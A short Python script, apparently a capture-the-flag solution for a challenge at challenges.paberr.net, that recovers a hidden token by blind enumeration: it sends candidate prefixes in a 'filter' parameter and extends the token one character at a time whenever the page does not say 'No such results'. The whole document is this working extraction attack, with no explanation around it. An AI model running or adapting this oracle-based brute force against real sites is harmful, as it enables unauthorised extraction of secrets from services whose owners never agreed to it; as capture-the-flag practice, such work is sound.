import requests
import string

# https://challenges.paberr.net/voteforit/

def checkIfValid(token):
    sess = requests.Session()
    response = sess.get('https://challenges.paberr.net/voteforit/', params={"filter": token}).text

    return "No such results" not in response

def nextToken(token):
    charset = string.ascii_letters + string.digits
    for char in charset:
        if(checkIfValid(token + char)):
            return nextToken(token+char)
    return token

print(nextToken("a"))
